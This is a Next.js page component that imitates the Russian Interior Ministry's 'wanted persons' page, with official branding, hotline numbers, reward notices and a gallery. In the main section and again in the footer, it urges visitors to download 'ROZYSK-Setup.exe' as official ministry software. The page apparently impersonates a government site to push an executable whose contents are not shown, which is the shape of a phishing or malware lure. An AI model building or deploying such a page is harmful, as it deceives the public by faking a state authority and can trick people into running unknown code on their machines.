'use client';

import Link from "next/link";
import { useState } from "react";
import WantedPersonsGallery from "@/components/WantedPersonsGallery";
import PersonSearchForm from "@/components/PersonSearchForm";
import FileDownloader from "@/components/FileDownloader";
import Image from "next/image";

export default function Home() {
  const [isAccessibilityMode, setIsAccessibilityMode] = useState(false);

  const toggleAccessibilityMode = () => {
    setIsAccessibilityMode(!isAccessibilityMode);
  };

  const accessibilityStyles = isAccessibilityMode ? {
    backgroundColor: '#000000',
    color: '#ffffff',
    fontSize: '1.5em'
  } : {};

  const accessibilityClasses = isAccessibilityMode 
    ? 'bg-black text-white' 
    : 'bg-white';

  return (
    <div className={`min-h-screen ${accessibilityClasses}`} style={accessibilityStyles}>
      {/* Top Bar */}
      <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-gray-100 border-gray-300'} border-b py-1`}>
        <div className="container mx-auto px-4">
          <div className={`flex justify-between items-center text-xs ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
            <div className="flex space-x-4">
              <button 
                onClick={toggleAccessibilityMode}
                className={`hover:underline cursor-pointer ${
                  isAccessibilityMode ? 'text-white' : 'text-gray-800'
                }`}
              >
                {isAccessibilityMode ? 'Обычная версия' : 'Версия для слабовидящих'}
              </button>
            </div>
            <div className="flex space-x-4">
            </div>
          </div>
        </div>
      </div>

      {/* Header */}
      <header className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-white border-gray-200'} border-b`}>
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-6">
              <div className="w-20 h-24">
                <Image 
                width={80} 
                height={96}
                  priority

                  src="/logo.png" 
                  alt="Герб России" 
                  className="w-full h-full object-contain"
                />
              </div>
              <div>
                <h1 className={`text-2xl font-bold leading-tight ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
                  МИНИСТЕРСТВО ВНУТРЕННИХ ДЕЛ
                </h1>
                <p className={`text-lg font-medium ${isAccessibilityMode ? 'text-white' : 'text-gray-700'}`}>РОССИЙСКОЙ ФЕДЕРАЦИИ</p>
              </div>
            </div>
            <div className="text-right">
                <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-red-50 border-red-200'} border rounded-lg p-3`}>
                  <p className={`text-sm mb-1 ${isAccessibilityMode ? 'text-white' : 'text-gray-600'}`}>Телефон экстренных служб</p>
                  <p className={`text-3xl font-bold ${isAccessibilityMode ? 'text-white' : 'text-red-600'}`}>102</p>
                </div>
                <div className={`mt-2 text-sm ${isAccessibilityMode ? 'text-white' : 'text-gray-500'}`}>
                  <p>Телефон доверия:</p>
                  <p className="font-semibold">8 (495) 667-09-49</p>
                </div>
              </div>
          </div>
        </div>
      </header>

      {/* Breadcrumbs */}
      <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-gray-50 border-gray-200'} border-b`}>
        <div className="container mx-auto px-4 py-2">
          <div className={`text-sm ${isAccessibilityMode ? 'text-white' : 'text-gray-600'}`}>
            <Link href="/" className={`${isAccessibilityMode ? 'hover:text-gray-300' : 'hover:text-blue-600'}`}>Главная</Link>
            <span className="mx-2">›</span>
            <span className={isAccessibilityMode ? 'text-white' : 'text-gray-800'}>Внимание, розыск!</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6">
        {/* Page Title */}
        <div className="mb-6">
          <h1 className={`text-3xl font-bold mb-4 ${isAccessibilityMode ? 'text-white' : 'text-red-600'}`}>Внимание, розыск!</h1>
          <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-yellow-50 border-yellow-400'} border-l-4 p-4 mb-6`}>
            <p className={isAccessibilityMode ? 'text-white' : 'text-gray-800'}>
              Сведения о лицах, находящихся в розыске, размещаются на интернет-ресурсе МВД России 
              и удаляются по решению следственных органов, органов дознания и судебных органов.
            </p>
          </div>
        </div>

        {/* Reward Announcements */}
        <div className="space-y-6 mb-8">
          <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-white border-gray-200'} border rounded-lg p-6 shadow-sm`}>
            <div className="flex items-start space-x-4">
              <div className={`${isAccessibilityMode ? 'bg-white' : 'bg-red-100'} p-3 rounded-full`}>
                <svg className={`w-6 h-6 ${isAccessibilityMode ? 'text-black' : 'text-red-600'}`} fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="flex-1">
                <h2 className={`text-xl font-bold mb-3 ${isAccessibilityMode ? 'text-white' : 'text-gray-900'}`}>
                  МВД России назначило вознаграждение за информацию, способствующую раскрытию убийства новорожденного ребенка в Камчатском крае
                </h2>
                <div className={`space-y-3 ${isAccessibilityMode ? 'text-white' : 'text-gray-700'}`}>
                  <p>
                    Сотрудники ГУУР МВД России и УУР УМВД России по Камчатскому краю во взаимодействии со следственными органами ведут работу по раскрытию тяжкого преступления в отношении новорожденного ребенка. Его тело было обнаружено 6 марта 2024 года на территории городской свалки в городе Петропавловске-Камчатском.
                  </p>
                  <p>
                    По данному факту следственными органами возбуждено уголовное дело по признакам преступления, предусмотренного статьей 106 Уголовного кодекса Российской Федерации «Убийство матерью новорожденного ребенка».
                  </p>
                  <div className={`${isAccessibilityMode ? 'bg-black border border-white' : 'bg-blue-50'} p-4 rounded-lg`}>
                    <h3 className={`font-semibold mb-2 ${isAccessibilityMode ? 'text-white' : 'text-blue-900'}`}>Контактная информация:</h3>
                    <div className="text-sm space-y-1">
                      <p>8 (4152) 27-11-02 или 102 (Дежурная часть УМВД России по Камчатскому краю)</p>
                      <p>8 (4152) 43-50-51, +7-961-970-70-40 (Управление уголовного розыска УМВД России по Камчатскому краю)</p>
                    </div>
                  </div>
                  <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-green-50 border-green-200'} border p-4 rounded-lg`}>
                    <p className={`font-bold text-lg ${isAccessibilityMode ? 'text-white' : 'text-green-800'}`}>
                      МВД России гарантирует вознаграждение в размере одного миллиона рублей за значимую помощь в раскрытии этого преступления.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className={` border border-gray-200 rounded-lg p-6 shadow-sm ${isAccessibilityMode ? 'bg-black border-white' : 'bg-white border-gray-200'}`}>
            <div className="flex items-start space-x-4">
              <div className="bg-red-100 p-3 rounded-full">
                <svg className="w-6 h-6 text-red-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="flex-1">
                <h2 className={`text-xl font-bold mb-3 ${isAccessibilityMode ? 'text-white' : 'text-gray-900'}`}>
                  МВД России объявляет о назначении вознаграждения за информацию, способствующую раскрытию тяжкого преступления в отношении несовершеннолетнего в Юринском районе Республики Марий Эл
                </h2>
                <div className={`space-y-3 ${isAccessibilityMode ? 'text-white' : 'text-gray-700'}`}>
                  <p>
                    Сотрудники ГУУР МВД России и УУР МВД по Республике Марий Эл во взаимодействии с другими подразделениями ведут работу по раскрытию убийства 9-летнего мальчика в деревне Быковка Юринского района, которое было совершено в начале августа 2006 года.
                  </p>
                  <div className={`${isAccessibilityMode ? 'bg-black border border-white' : 'bg-blue-50'} p-4 rounded-lg`}>
                    <h3 className={`font-semibold mb-2 ${isAccessibilityMode ? 'text-white' : 'text-blue-900'}`}>Контактная информация:</h3>
                    <div className={`text-sm space-y-1 ${isAccessibilityMode ? 'text-white' : 'text-gray-700'}`}>
                      <p>8 (8362) 41-77-73 (Дежурная часть МВД по Республике Марий Эл)</p>
                      <p>8 (83644) 3-21-02 (Дежурная часть ОП № 6 МО МВД России)</p>
                      <p>8 (8362) 68-01-74 (Управление уголовного розыска МВД по Республике Марий Эл)</p>
                    </div>
                  </div>
                  <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-green-50 border-green-200'} border p-4 rounded-lg`}>
                    <p className={`font-bold text-lg ${isAccessibilityMode ? 'text-white' : 'text-green-800'}`}>
                      МВД России гарантирует вознаграждение в размере одного миллиона рублей за значимую помощь в раскрытии тяжкого преступления.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Wanted Persons Gallery */}
        <div className="mb-8">
          <WantedPersonsGallery isAccessibilityMode={isAccessibilityMode} />
        </div>

        {/* Download Section */}
        <div className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-blue-50 border-blue-500'} border-l-4 p-6 rounded`}>
          <h3 className={`text-xl font-bold mb-4 ${isAccessibilityMode ? 'text-white' : 'text-blue-800'}`}>
            Специальное программное обеспечение МВД
          </h3>
          <p className={`mb-4 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
            Загрузите официальное программное обеспечение для работы с системами МВД России.
          </p>
          <FileDownloader 
            filename="ROZYSK-Setup.exe"
            displayName="Установщик программы РОЗЫСК"
            isAccessibilityMode={isAccessibilityMode}
          />
        </div>
      </main>

      {/* Person Search Form */}
      <section className={`py-12 ${isAccessibilityMode ? 'bg-black' : 'bg-gray-50'}`}>
        <div className="container mx-auto px-4">
          <PersonSearchForm isAccessibilityMode={isAccessibilityMode} />
        </div>
      </section>

      {/* Footer */}
      <footer className={`${isAccessibilityMode ? 'bg-black border-white' : 'bg-gray-100 border-gray-300'} border-t py-8 mt-12`}>
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-4 gap-8">
            <div>
              <h4 className={`font-bold mb-4 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>Контактная информация</h4>
              <div className={`text-sm space-y-2 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
                <p>Телефон экстренных служб: <span className="font-semibold">102</span></p>
                <p>Телефон доверия: <span className="font-semibold">8 (495) 667-09-49</span></p>
                <p>Официальный сайт: <span className="font-semibold">мвд.рф</span></p>
              </div>
            </div>

            <div>
              <h4 className={`font-bold mb-4 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>Полезная информация</h4>
              <ul className="space-y-2 text-sm">
                <li><Link href="#" className={`${isAccessibilityMode ? 'text-white hover:text-gray-300' : 'text-gray-800 hover:text-blue-600'}`}>Противодействие коррупции</Link></li>
                <li><Link href="#" className={`${isAccessibilityMode ? 'text-white hover:text-gray-300' : 'text-gray-800 hover:text-blue-600'}`}>Обращения граждан</Link></li>
                <li><Link href="#" className={`${isAccessibilityMode ? 'text-white hover:text-gray-300' : 'text-gray-800 hover:text-blue-600'}`}>Вакансии</Link></li>
                <li><Link href="#" className={`${isAccessibilityMode ? 'text-white hover:text-gray-300' : 'text-gray-800 hover:text-blue-600'}`}>Закупки</Link></li>
              </ul>
            </div>
            <div>
              <h4 className={`font-bold mb-4 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>Специальное ПО</h4>
              <div className={`text-sm space-y-2 ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
                <p>Загрузите официальное программное обеспечение МВД России</p>
                <FileDownloader 
                  filename="ROZYSK-Setup.exe"
                  displayName="Программа РОЗЫСК"
                  isAccessibilityMode={isAccessibilityMode}
                />
              </div>
            </div>
          </div>
          <div className="border-t border-gray-300 mt-8 pt-6">
            <div className={`flex flex-col md:flex-row justify-between items-center text-sm ${isAccessibilityMode ? 'text-white' : 'text-gray-800'}`}>
              <p>
                © 2024 Министерство внутренних дел Российской Федерации. Все права защищены.
              </p>
              <div className="flex space-x-4 mt-4 md:mt-0">
                <Link href="#" className={`${isAccessibilityMode ? 'hover:text-gray-300' : 'hover:text-blue-600'}`}>Политика конфиденциальности</Link>
                <Link href="#" className={`${isAccessibilityMode ? 'hover:text-gray-300' : 'hover:text-blue-600'}`}>Карта сайта</Link>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
